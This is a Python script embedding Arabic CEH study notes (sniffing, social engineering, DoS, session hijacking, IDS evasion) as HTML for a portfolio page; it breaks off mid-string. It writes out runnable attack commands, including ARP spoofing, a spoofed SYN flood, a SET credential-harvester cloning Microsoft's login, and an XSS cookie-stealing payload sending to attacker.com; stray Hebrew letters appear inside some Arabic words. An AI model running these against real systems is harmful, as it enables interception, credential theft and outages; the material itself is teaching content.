import re

html_path = r"d:\abdo_portfolio\main\templates\main\methodology.html"
with open(html_path, "r", encoding="utf-8") as f:
    content = f.read()

# The deep, comprehensive CEH content
ceh_content_deep = """

      <!-- CEH Module 8: Sniffing -->
      <div class="meth-content-view" id="meth-content-ceh_sniff" style="display: none; --tool-color: #0284c7;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🕵️</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 8: Sniffing & MITM</h1>
            <p class="phase-module-tagline">الدليل الشامل لاعتراض وتحليل حركة مرور الشبكات السلكية واللاسلكية</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-time">⏱ Layer 2/3 Attacks</span>
              <span class="badge badge-tool">🔧 Wireshark · Ettercap · Bettercap</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 ما هو الـ Sniffing؟</h5>
            <p>هو عملية اعتراض وقراءة حزم البيانات (Packets) التي تمر عبر الشبكة. يشبه الأمر التنصت على مكالمة هاتفية. إذا كانت البيانات غير مشفرة (مثل HTTP, FTP, Telnet)، يمكن للمهاجم سرقة كلمات المرور، رسائل البريد، والملفات بسهولة بالغة.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 الهدف من الـ Sniffing</h5>
            <p>الهدف الأساسي هو كشف المعلومات الحساسة التي تنتقل عبر الشبكة قبل وصولها للوجهة، أو التلاعب بها (Man-in-the-Middle) لإجبار المستخدمين على تحميل برمجيات خبيثة أو توجيههم لمواقع مزيفة.</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>الفرق بين Active و Passive Sniffing</h3></div>
          <ul>
            <li><strong>Passive Sniffing (التنصت السلبي):</strong> يحدث في الشبكات القديمة التي تستخدم <code>Hubs</code>. الـ Hub يقوم ببث (Broadcast) أي بيانات يستقبلها لجميع الأجهزة المتصلة به. المهاجم هنا لا يحتاج لفعل أي شيء سوى تشغيل أداة التقاط (مثل Wireshark) في وضع الـ <code>Promiscuous Mode</code> وجمع البيانات بصمت تام.</li>
            <li><strong>Active Sniffing (التنصت النشط):</strong> يحدث في الشبكات الحديثة التي تستخدم <code>Switches</code>. الـ Switch ذكي، يمتلك جدول (CAM Table) يربط كل عنوان MAC بمنفذ (Port) محدد، ويرسل البيانات للوجهة فقط. للتنصت هنا، يجب على المهاجم خداع الـ Switch أو الضحية (عبر هجمات مثل ARP Spoofing).</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أبرز هجمات الشبكة (Network Attacks) بالتفصيل</h3></div>
          
          <h4>1. MAC Flooding</h4>
          <p>يقوم المهاجم بإرسال آلاف عناوين الـ MAC المزيفة في ثوانٍ معدودة. الـ Switch يمتلك ذاكرة محدودة (CAM Table). عندما تمتلئ هذه الذاكرة، يصاب الـ Switch بالارتباك ويدخل في وضع <code>Fail-Open Mode</code>، ليتحول فعلياً إلى Hub غبي يبث البيانات لجميع المنافذ.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">استخدام أداة macof</span></div>
            <pre><code>macof -i eth0 -n 100000</code></pre>
          </div>

          <h4>2. ARP Poisoning (Man-in-the-Middle)</h4>
          <p>بروتوكول ARP مسؤول عن تحويل الـ IP إلى MAC Address. لا يمتلك ARP أي آلية للتحقق من الهوية. يقوم المهاجم بإرسال رسائل ARP مزيفة للضحية يخبره فيها: "أنا الـ Router"، ويرسل رسالة للـ Router يخبره: "أنا الضحية". فتمر كل البيانات عبر جهاز المهاجم أولاً.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">arpspoof (تسميم الضحية والراوتر)</span></div>
            <pre><code># Enable IP Forwarding so internet doesn't drop for the victim
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison Victim (Tell victim: I am the gateway)
arpspoof -i eth0 -t &lt;Victim_IP&gt; &lt;Gateway_IP&gt;

# Poison Gateway (Tell gateway: I am the victim)
arpspoof -i eth0 -t &lt;Gateway_IP&gt; &lt;Victim_IP&gt;</code></pre>
          </div>

          <h4>3. DHCP Starvation & Spoofing</h4>
          <p><strong>Starvation:</strong> يقوم المهاجم بطلب عناوين IP كثيرة جداً بعناوين MAC مزيفة حتى يستنزف الـ DHCP Server، فلا يجد المستخدمون الشرعيون أي IP متاح للاتصال بالشبكة.<br>
          <strong>Spoofing:</strong> بعد إسقاط الخادم الشرعي، يرفع المهاجم <code>Rogue DHCP Server</code> يقوم بتوزيع عناوين IP للضحايا مع تعيين جهازه كـ Default Gateway و DNS Server.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">استنزاف DHCP باستخدام Yersinia</span></div>
            <pre><code>yersinia dhcp -attack 1 -interface eth0</code></pre>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أدوات الـ Sniffing المتقدمة</h3></div>
          <table class="tools-table">
            <thead>
              <tr><th>الأداة</th><th>شرح متعمق</th></tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Wireshark</strong></td>
                <td>المعيار الذهبي لتحليل الحزم (Packet Analysis). يمكنه التقاط وفك تشفير مئات البروتوكولات. ميزة الـ <code>Display Filters</code> فيه قوية جداً (مثال: <code>http.request.method == "POST"</code> لاصطياد كلمات المرور).</td>
              </tr>
              <tr>
                <td><strong>Bettercap</strong></td>
                <td>الإصدار العصري من Ettercap. أداة سطر أوامر قوية جداً لهجمات MITM، تدعم الـ SSL Stripping مدمجاً، يمكنها حقن جافاسكريبت في صفحات الويب، وسحب كلمات المرور تلقائياً من الشبكة.</td>
              </tr>
              <tr>
                <td><strong>tcpdump</strong></td>
                <td>النسخة الأخف من Wireshark وتعمل من الـ Terminal. ممتازة للسيرفرات التي لا تحتوي على واجهة رسومية (GUI). أمر شائع: <code>tcpdump -i eth0 -w capture.pcap</code> لحفظ الحزم وتحليلها لاحقاً.</td>
              </tr>
              <tr>
                <td><strong>Cain & Abel</strong></td>
                <td>أداة قديمة لكنها تدرس في المنهج كلاسيكياً، تعمل على نظام Windows وتتخصص في فك التشفير، التنصت، كسر الهاشات، وتسجيل محادثات الـ VoIP.</td>
              </tr>
            </tbody>
          </table>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>تجاوز التشفير (SSL Stripping)</h3></div>
          <p>لو كان الموقع يستخدم HTTPS، لن يستفيد المهاجم من التنصت العادي. لذلك يستخدم تقنية <strong>SSL Stripping</strong> التي تعمل كوكيل (Proxy). عندما تطلب الضحية موقعاً، يقوم المهاجم بفتح اتصال HTTPS آمن بينه وبين الخادم، ولكنه يعطي للضحية نسخة HTTP (غير مشفرة) من الموقع. الضحية يكتب الباسورد في الـ HTTP، يسرقه المهاجم، ثم يرسله مشفراً للخادم لتجنب إثارة الشبهات.</p>
        </div>

      </div>

      <!-- CEH Module 9: Social Engineering -->
      <div class="meth-content-view" id="meth-content-ceh_se" style="display: none; --tool-color: #ef4444;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🎭</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 9: Social Engineering</h1>
            <p class="phase-module-tagline">الهندسة الاجتماعية: اختراق العقول بدلاً من الأنظمة</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 Critical Risk</span>
              <span class="badge badge-tool">🔧 SET · GoPhish · Evilginx2</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 ما هي الهندسة الاجتماعية؟</h5>
            <p>هي فن التلاعب بالأشخاص لجعلهم يقومون بأفعال معينة أو إفشاء معلومات سرية. مهما كان الـ Firewall أو الانتي فايروس قوياً، يمكن لمكالمة هاتفية واحدة أو إيميل مزيف أن يعطي المهاجم صلاحيات كاملة على النظام.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 لماذا تُعتبر خطيرة؟</h5>
            <p>لأنها تستهدف "العنصر البشري"، وهو الحلقة الأضعف في أي نظام أمني. المخترق لا يحتاج للبحث عن ثغرة Zero-Day معقدة، بل يبحث عن موظف ساذج أو خائف أو متعاون.</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>سيكولوجية الاستهداف (لماذا تنجح؟)</h3></div>
          <p>تعتمد هجمات الهندسة الاجتماعية على استغلال المشاعر الإنسانية الأساسية:</p>
          <ul>
            <li><strong>الخوف / الاستعجال (Urgency):</strong> "حسابك سيتم إغلاقه خلال 24 ساعة إذا لم تؤكد بياناتك".</li>
            <li><strong>السلطة (Authority):</strong> انتحال شخصية المدير التنفيذي (CEO) أو جهة حكومية.</li>
            <li><strong>الثقة (Trust):</strong> التظاهر كزميل عمل من قسم الـ IT يعرض المساعدة.</li>
            <li><strong>الفضول (Curiosity):</strong> إرسال ملف بعنوان "كشوفات رواتب الموظفين 2024".</li>
            <li><strong>الجشع (Greed):</strong> إيهام الضحية بربح جائزة مالية.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أنواع الهندسة الاجتماعية (تصنيف مفصل)</h3></div>
          
          <h4>1. Human-Based (الهجمات المعتمدة على التفاعل البشري المباشر)</h4>
          <ul>
            <li><strong>Impersonation (انتحال الشخصية):</strong> يتظاهر المهاجم بأنه فني صيانة إنترنت، عامل نظافة، أو موظف جديد ليدخل المبنى ويبدأ في زرع أجهزة أو سرقة أوراق.</li>
            <li><strong>Tailgating / Piggybacking:</strong> الانتظار عند الباب المؤمن ببطاقة دخول، وعندما يفتح موظف الباب، يدخل المهاجم خلفه مباشرة بحجة أنه نسي بطاقته (أو يحمل صندوقاً ثقيلاً).</li>
            <li><strong>Dumpster Diving:</strong> النزول حرفياً للبحث في سلة مهملات الشركة! الموظفون يتخلصون من جداول المواعيد، كلمات المرور المكتوبة على ورق (Sticky Notes)، ومخططات الشبكة بدون تمزيقها (Shredding).</li>
            <li><strong>Shoulder Surfing:</strong> استراق النظر لشاشة الضحية في الكافيهات أو المواصلات أثناء كتابة كلمة المرور.</li>
            <li><strong>Eavesdropping:</strong> التنصت على محادثات الموظفين السرية في الأماكن العامة.</li>
          </ul>

          <h4>2. Computer-Based (الهجمات المعتمدة على الأجهزة)</h4>
          <ul>
            <li><strong>Phishing (التصيد الاحتيالي):</strong> إرسال آلاف الإيميلات المزيفة عشوائياً تبدو كأنها من بنك أو فيسبوك.</li>
            <li><strong>Spear Phishing (التصيد الموجه):</strong> تصيد دقيق جداً! المهاجم يجمع معلومات عن موظف محدد (اسمه، وظيفته، اسم مديره) ويرسل له إيميلاً مخصصاً بنسبة نجاح عالية جداً.</li>
            <li><strong>Whaling (صيد الحيتان):</strong> Spear Phishing موجه لشخصية ذات منصب عالي جداً (مثل CEO أو CFO). غالباً يكون الهجوم أكثر تعقيداً واحترافية.</li>
            <li><strong>Baiting (الاصطياد):</strong> المهاجم يترك فلاشة USB مصابة بفيروس في جراج الشركة مكتوب عليها "رواتب 2024". الموظف سيأخذها الفضول لفتحها على جهازه في الشركة.</li>
            <li><strong>Watering Hole (حفرة الماء):</strong> بدلاً من مهاجمة الشركة مباشرة (حمايتها قوية)، يقوم المهاجم باختراق موقع ويب عادي (مثلاً موقع يطلب منه الموظفون وجبات الغداء) ويزرع فيه Malware ليصيب الموظفين عند زيارتهم له.</li>
          </ul>

          <h4>3. Mobile & Voice-Based</h4>
          <ul>
            <li><strong>Vishing (Voice Phishing):</strong> مكالمة هاتفية، المهاجم يدعي أنه موظف البنك ويطلب الـ OTP.</li>
            <li><strong>Smishing (SMS Phishing):</strong> إرسال رسالة نصية قصيرة تحتوي على رابط خبيث (مثل: "طردك من البريد محتجز، ادفع الرسوم عبر الرابط").</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>التطبيق العملي: إطار عمل SET</h3></div>
          <p>تُعتبر أداة <strong>Social-Engineer Toolkit (SET)</strong> الأداة الرسمية في منهج CEH لاختبار هذه الهجمات. تتيح استنساخ أي موقع ويب في ثوانٍ لاستقبال بيانات الضحايا.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">خطوات عمل Site Cloner و Credential Harvester</span></div>
            <pre><code># 1. Start SET as root
sudo setoolkit

# 2. Select Social-Engineering Attacks
> 1

# 3. Select Website Attack Vectors
> 2

# 4. Select Credential Harvester Attack Method
> 3

# 5. Select Site Cloner
> 2

# 6. Enter the IP address for the reverse connection (Your IP)
> 192.168.1.100

# 7. Enter the URL to clone
> https://login.microsoftonline.com

# Tool will start an Apache server. When victim visits 192.168.1.100, 
# they see the exact Microsoft login page. Passwords entered are logged in plaintext!</code></pre>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>هجمات متقدمة: تجاوز المصادقة الثنائية (MFA Bypass)</h3></div>
          <p>الـ Phishing التقليدي يفشل إذا كانت الضحية تستخدم 2FA أو MFA. لذلك ظهرت أدوات مثل <strong>Evilginx2</strong>. هي تعمل كـ (Reverse Proxy) حقيقي بين الضحية والسيرفر الحقيقي. عندما تدخل الضحية كود الـ OTP، يقوم Evilginx2 بتمريره للسيرفر، ثم <strong>يسرق الـ Session Cookie</strong> الجاهز الذي يمنحه السيرفر للمستخدم. باستخدام هذا الكوكي، يمكن للمهاجم الدخول للحساب مباشرة بدون الحاجة للباسورد أو الـ OTP!</p>
        </div>
      </div>

      <!-- CEH Module 10: Denial of Service -->
      <div class="meth-content-view" id="meth-content-ceh_dos" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="phase-module-icon">💣</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 10: Denial of Service (DoS & DDoS)</h1>
            <p class="phase-module-tagline">الدليل الشامل لإسقاط الخدمات، استنزاف الموارد، وشبكات البوت نت</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🟡 Medium Risk</span>
              <span class="badge badge-tool">🔧 hping3 · Slowloris · LOIC</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 ما هو الـ DoS / DDoS؟</h5>
            <p><strong>DoS (Denial of Service):</strong> هجوم ينفذه جهاز واحد ضد خادم واحد بهدف استنزاف موارده (المعالج، الرامات، أو الباندويث) حتى يسقط ولا يستجيب للمستخدمين الشرعيين.<br>
            <strong>DDoS (Distributed DoS):</strong> هجوم تنفذه آلاف الأجهزة (Botnet) في نفس الوقت ضد الهدف، مما يجعله مدمراً وأصعب بكثير في الصد والتتبع.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 تأثير الهجوم</h5>
            <p>خسائر مالية ضخمة للشركات، توقف الخدمات الحرجة، وقد يُستخدم الهجوم كتمويه (Smokescreen) لإشغال فريق الحماية (SOC) بينما يقوم المهاجم باختراق قاعدة البيانات من جهة أخرى.</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>تصنيفات هجمات حجب الخدمة (Attack Categories)</h3></div>
          
          <h4>1. Volumetric Attacks (هجمات الباندويث)</h4>
          <p>الهدف هو خنق سعة الاتصال (Bandwidth) الخاصة بالخادم. الهجوم يُقاس بـ Bits per second (Bps).<br>
          <strong>أمثلة:</strong> UDP Flood، ICMP Flood (Ping Flood). يقوم المهاجم بإرسال ملايين الحزم الضخمة، فيمتلئ الخط الخاص بالسيرفر ولا يوجد مساحة للطلبات الشرعية.</p>

          <h4>2. Protocol Attacks (هجمات البروتوكول / الشبكة)</h4>
          <p>تستهدف إنهاك أجهزة البنية التحتية مثل الـ Firewalls، الـ Load Balancers، أو موارد نظام التشغيل عن طريق استغلال نقاط ضعف في بروتوكولات الطبقة الثالثة والرابعة (Layer 3/4). يُقاس بـ Packets per second (Pps).<br>
          <strong>أمثلة:</strong> <br>
          - <strong>SYN Flood:</strong> استغلال المصافحة الثلاثية (3-Way Handshake) للـ TCP. المهاجم يرسل حزمة SYN، السيرفر يرد بـ SYN-ACK وينتظر الـ ACK ليفتح الجلسة في الرامات (Half-open connection). المهاجم لا يرسل الـ ACK أبداً، ويرسل ملايين الـ SYN الأخرى حتى تمتلئ رامات السيرفر ويسقط!<br>
          - <strong>Smurf Attack:</strong> إرسال ICMP (Ping) مزور يحمل IP الضحية إلى عنوان Broadcast في شبكة كبيرة، فتقوم كل الأجهزة في تلك الشبكة بالرد على الضحية في نفس الوقت!</p>

          <h4>3. Application Layer Attacks (هجمات طبقة التطبيقات)</h4>
          <p>أخطر وأذكى أنواع الهجمات! تبدو كأنها حركة مرور شرعية تماماً، ولا تحتاج باندويث ضخم. تستهدف الطبقة السابعة (Layer 7) لاستنزاف معالج الخادم. تُقاس بـ Requests per second (Rps).<br>
          <strong>أمثلة:</strong> <br>
          - <strong>HTTP GET/POST Flood:</strong> إرسال طلبات للصفحات الثقيلة أو عمليات بحث ترهق قاعدة البيانات بشكل متكرر.<br>
          - <strong>Slowloris Attack:</strong> المهاجم يفتح اتصالات HTTP كثيرة مع الخادم، ولكنه يرسل الطلب ببطء شديد جداً (حرفاً واحداً كل 10 ثوانٍ). الخادم يبقى منتظراً اكتمال الطلب، ويظل يفتح اتصالات جديدة حتى يستنفد الحد الأقصى للاتصالات (Max Connections) ويسقط، وكل هذا يحدث باستخدام كمية ضئيلة جداً من الإنترنت من جهاز المهاجم!</p>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>DDoS Amplification (هجمات التضخيم الانعكاسي)</h3></div>
          <p>أشرس أنواع הـ DDoS وأكثرها قدرة تدميرية. تعتمد على فكرتين:</p>
          <ol>
            <li><strong>Reflection (الانعكاس):</strong> المهاجم يزور عنوان الـ IP الخاص به (IP Spoofing) ويجعله نفس IP الضحية، ثم يرسل الطلب لخادم عام على الإنترنت. الخادم العام سيرد على הـ IP המزور (الضحية) بدلاً من المهاجم.</li>
            <li><strong>Amplification (التضخيم):</strong> المهاجم يبحث عن خدمات يكون الرد فيها أضعاف أضعاف حجم الطلب. يرسل المهاجم طلباً بحجم 10 بايت، فيقوم الخادم بالرد على الضحية بملف حجمه 500 بايت (تضخيم 50 ضعفاً!).</li>
          </ol>
          <p><strong>أشهر الخوادم المستخدمة:</strong>
          - <strong>DNS Amplification:</strong> يطلب المهاجم سجل (ANY) واسع النطاق. نسبة التضخيم تصل لـ 54x.
          - <strong>NTP Amplification:</strong> استخدام أمر `monlist` الذي يعيد قائمة بآخر 600 جهاز اتصل بالخادم. نسبة التضخيم تصل لـ 556x.
          - <strong>Memcached Amplification:</strong> الأسوأ على الإطلاق! نسبة تضخيم وصلت في بعض الهجمات لـ 51,000x!</p>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>تطبيق عملي: أوامر ومحاكاة</h3></div>
          
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">استخدام hping3 لعمل SYN Flood احترافي (عبر تزوير مصدر الـ IPs عشوائياً)</span></div>
            <pre><code>hping3 -S --flood --rand-source -p 80 &lt;Target_IP&gt;</code></pre>
            <p><strong>شرح الأمر:</strong><br>
            <code>-S</code>: إرسال حزم SYN فقط.<br>
            <code>--flood</code>: إرسال الحزم بأقصى سرعة ممكنة دون انتظار الرد.<br>
            <code>--rand-source</code>: كل حزمة تخرج بـ IP مصدر عشوائي لتجاوز الفلترة.<br>
            <code>-p 80</code>: استهداف منفذ الويب.</p>
          </div>

          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">استخدام Slowloris لإسقاط خادم Apache (Application Layer)</span></div>
            <pre><code>slowloris &lt;Target_IP&gt; -s 500</code></pre>
            <p>يقوم بفتح 500 اتصال والحفاظ عليها مفتوحة أطول فترة ممكنة عبر إرسال ترويسات جزئية.</p>
          </div>
        </div>
      </div>

      <!-- CEH Module 11: Session Hijacking -->
      <div class="meth-content-view" id="meth-content-ceh_hijack" style="display: none; --tool-color: #8b5cf6;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🔓</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 11: Session Hijacking</h1>
            <p class="phase-module-tagline">كيفية اختطاف هويات المستخدمين بعد تسجيل الدخول الشرعي</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-tool">🔧 Burp Suite · OWASP ZAP</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 ما هو اختطاف الجلسات؟</h5>
            <p>بعد قيام المستخدم بكتابة اليوزر والباسورد بنجاح، يقوم الخادم بإنشاء "جلسة" (Session) ويعطيه معرّف فريد (Session ID/Cookie). اختطاف الجلسة يعني أن يقوم المهاجم بسرقة هذا المعرف واستخدامه ليدخل الخادم بحساب المستخدم دون أن يعرف كلمة المرور.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 مستويات الهجوم</h5>
            <p>يمكن أن يتم ההجوم على مستوى الشبكة (Network Level) لاختطاف اتصالات TCP حية، أو على مستوى التطبيقات (Application Level) لاختطاف جلسات الويب.</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>Network Level Hijacking (اختطاف جلسات TCP)</h3></div>
          <p>في هذا الهجوم، المهاجم يعترض اتصال قائم بين الضحية والخادم (مثلاً اتصال Telnet أو FTP).</p>
          <ul>
            <li><strong>Blind Hijacking:</strong> المهاجم يرسل أوامر للخادم منتحلاً شخصية الضحية، لكنه أعمى (لا يرى رد الخادم لأن الرد يذهب للضحية الحقيقية). يتطلب توقع أرقام Sequence Numbers.</li>
            <li><strong>Active Hijacking (RST/Hijack):</strong> يقوم المهاجم بإسقاط الضحية من الاتصال عبر إرسال حزمة TCP RST (Reset)، ثم يتولى هو استكمال جلسة הـ TCP مع الخادم، مما يجعله يتحكم تحكماً كاملاً بالجلسة ويتلقى الردود.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>Application Level Hijacking (اختطاف جلسات الويب)</h3></div>
          <p>هذا النوع هو الأكثر شيوعاً في اختراق المواقع (Web Hacking). يتم عبر عدة أساليب لسرقة الـ <code>Session ID</code>:</p>
          
          <h4>1. Session Sniffing (التقاط الكوكيز من الشبكة)</h4>
          <p>إذا كان الموقع لا يستخدم HTTPS، أو تم تطبيق هجوم SSL Stripping، يمكن للمهاجم عبر Wireshark التقاط حزمة HTTP ورؤية الترويسة <code>Cookie: session_id=XYZ123</code> بوضوح.</p>

          <h4>2. Session Fixation (تثبيت الجلسة)</h4>
          <p>هجوم خبيث جداً! المهاجم لا يسرق جلسة الضحية، بل <strong>يُجبر הضحية</strong> على استخدام جلسة يمتلكها المهاجم.<br>
          <strong>الخطوات:</strong>
          1. المهاجم يدخل موقع البنك كزائر عادي ويأخذ `Session ID = 123`.
          2. يرسل المهاجم رابطاً للضحية: `http://bank.com/login?sessionid=123`.
          3. الضحية تضغط على الرابط وتقوم بتسجيل الدخول الفعلي في حسابها.
          4. الخادم الآن يربط حساب الضحية بالجلسة `123`.
          5. المهاجم يعود لمتصفحه الذي يحتوي أساساً على הגلسة `123` ويجد نفسه داخل حساب הضحية!</p>

          <h4>3. Cross-Site Scripting (XSS)</h4>
          <p>أشهر طريقة لسرقة الكوكيز. المهاجم يجد ثغرة XSS في الموقع ويحقن كود جافاسكريبت. عندما يزور הضحية الصفحة المصابة، يعمل الكود ويسرق الكوكي ويرسله لخادم المهاجم.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">مثال لـ Payload سرقة الكوكيز عبر XSS</span></div>
            <pre><code>&lt;script&gt;
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</code></pre>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>إجراءات الحماية المضادة (Countermeasures)</h3></div>
          <ul>
            <li><strong>HttpOnly Flag:</strong> تمنع الجافاسكريبت من الوصول للـ Cookies (تقتل هجوم הـ XSS المتعلق بالجلستات).</li>
            <li><strong>Secure Flag:</strong> تجبر المتصفح على إرسال الـ Cookies عبر HTTPS فقط (تمنع Session Sniffing).</li>
            <li><strong>تجديد الجلسة (Session Regeneration):</strong> يجب على الخادم تغيير معرّف الجلسة (Session ID) فور تسجيل الدخول بنجاح لمنع هجوم הـ Session Fixation.</li>
            <li><strong>ربط الجلسة بخصائص المستخدم:</strong> ربط הـ Session بالـ IP الخاص بالمستخدم والـ User-Agent (متصفحه). إذا حاول المهاجم استخدام الكوكي من IP أو جهاز مختلف، يتم رفضه.</li>
          </ul>
        </div>
      </div>

      <!-- CEH Module 12: Evading IDS/FW -->
      <div class="meth-content-view" id="meth-content-ceh_evade" style="display: none; --tool-color: #10b981;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🛡️</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 12: Evading IDS, Firewalls & Honeypots</h1>
            <p class="phase-module-tagline">فنون التخفي وتجاوز أنظمة الكشف المعقدة أثناء الاختراق</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-tool">🔧 Nmap · Ncat · Proxychains</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 تشريح أنظمة الحماية</h5>
            <p><strong>Firewall:</strong> يعمل كحارس أمن، ينظر إلى الـ IP والمنفذ ويسمح أو يمنع (Block/Allow).<br>
            <strong>IDS (Intrusion Detection):</strong> يعمل ككاميرات المراقبة والانذار، يحلل محتوى البيانات ليكتشف الهجمات وينذر الإدارة.<br>
            <strong>IPS (Intrusion Prevention):</strong> كاميرا مراقبة مسلحة، يكتشف الهجوم ويقطعه فوراً.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 آليات كشف IDS</h5>
            <p>إما <strong>Signature-Based</strong> (يبحث عن بصمات برمجيات معروفة، مثل الانتي فايروس)، أو <strong>Anomaly-Based</strong> (يبني خط أساس "Baseline" للسلوك الطبيعي، وإذا زاد الترافيك فجأة يعطي إنذار).</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>طرق التخفي وتجاوز الجدران (Evasion Techniques)</h3></div>
          
          <h4>1. تجزئة الحزم (Packet Fragmentation)</h4>
          <p>الـ IDS يعتمد على قراءة الـ Signature الكاملة في الحزمة (مثلاً كلمة <code>/etc/passwd</code>). لكي نخدعه، نقوم بتجزئة هذه الكلمة عبر عدة حزم صغيرة (IP Fragments). الحزمة الأولى تحمل <code>/et</code> والثانية <code>c/p</code> والثالثة <code>asswd</code>. الـ IDS لن يجد البصمة الكاملة فيمرر الحزم، ويقوم جهاز הضحية بإعادة تجميعها وقراءتها كاملة!</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">Nmap Fragmentation</span></div>
            <pre><code>nmap -f &lt;Target_IP&gt;       # Fragment packets into 8 bytes
nmap -ff &lt;Target_IP&gt;      # Fragment into 16 bytes
nmap --mtu 24 &lt;Target_IP&gt; # Custom MTU size</code></pre>
          </div>

          <h4>2. استخدام الشراك الخداعية (Decoy Scanning)</h4>
          <p>كيف تخفي مصدرك الحقيقي أثناء الفحص (Scanning)؟ تقوم بإرسال حزم الفحص من عنوان IP الخاص بك، وإرسال نفس الحزم في نفس الوقت من 10 عناوين IP عشوائية أخرى ومزيفة. مسؤول الحماية سيرى 11 جهازاً يقومون بهجوم، ولن يعرف من هو المهاجم الحقيقي.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">Nmap Decoys</span></div>
            <pre><code>nmap -D RND:10 &lt;Target_IP&gt;  # Generates 10 random decoy IPs + your real IP</code></pre>
          </div>

          <h4>3. التلاعب بمصدر المنفذ (Source Port Manipulation)</h4>
          <p>بعض إعدادات الـ Firewalls تكون خاطئة وتسمح بمرور الترافيك إذا كان قادماً من منفذ موثوق، مثل منفذ الـ DNS (53) أو HTTP (80).</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">Nmap Source Port</span></div>
            <pre><code>nmap -g 53 &lt;Target_IP&gt;   # Make scans originate from Port 53</code></pre>
          </div>

          <h4>4. تشويش الهجوم وإضافة بيانات زائدة (Data Append/Padding)</h4>
          <p>الـ Firewalls المتقدمة قد تشك في الحزم الفارغة تماماً. يمكنك إرفاق بيانات عشوائية لجعل الحزم تبدو طبيعية.</p>
          <div class="cmd-block">
            <pre><code>nmap --data-length 50 &lt;Target_IP&gt;   # Append 50 random bytes to packets</code></pre>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>Honeypots (أفخاخ العسل)</h3></div>
          <p>هي أجهزة أو سيرفرات وهمية تزرعها الشركات كفخ للمخترقين. تبدو مليئة بالثغرات الجذابة السهلة لاستدراجك. بمجرد اتصالك بها، تقوم بتسجيل كل حركاتك وأدواتك، وتعطي إنذاراً للفريق الأمني.<br>
          <strong>أنواعها:</strong>
          - <strong>Low-Interaction:</strong> برامج بسيطة تفتح بورتات وهمية (مثل 22) وتخزن محاولات تسجيل הדخول (مثل Honeyd, KFSensor).
          - <strong>High-Interaction:</strong> أنظمة تشغيل كاملة ومعقدة، يمكن للمخترق اختراقها فعلياً، ولكنها في شبكة معزولة مراقبة بالكامل.<br>
          <strong>كيف تكتشفها؟</strong>
          إذا وجدت سيرفراً كل منافذه (1 إلى 65535) مفتوحة وتستجيب، أو استجابات الخدمات (Banners) متطابقة أو بطيئة بشكل غريب، فأنت على الأغلب في פخ!</p>
        </div>
      </div>

      <!-- CEH Module 13: Web Servers -->
      <div class="meth-content-view" id="meth-content-ceh_webserver" style="display: none; --tool-color: #ffb020;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🌐</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 13: Hacking Web Servers</h1>
            <p class="phase-module-tagline">استهداف البنية التحتية، إعدادات الخوادم، واستغلال أخطاء الإدارة</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🟡 Medium Risk</span>
